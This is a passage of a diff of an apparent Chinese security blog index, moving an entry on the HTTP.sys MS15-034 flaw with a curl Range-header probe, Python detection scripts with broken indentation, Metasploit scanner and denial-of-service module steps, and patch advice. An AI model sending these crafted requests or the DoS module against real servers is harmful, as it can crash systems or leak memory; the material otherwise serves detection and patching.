<span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
-<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>命令执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HPP参数污染漏洞</title>
     <url>//4189faf9a367.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
@@ -2398,6 +2380,44 @@
       </categories>
       <tags>
         <tag>低危漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
+    <url>//67bda6fdaf83.html</url>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
+<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
+<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器打上了补丁，那么响应状态应该是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
+<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>命令执行漏洞</tag>
       </tags>
   </entry>
   <entry>
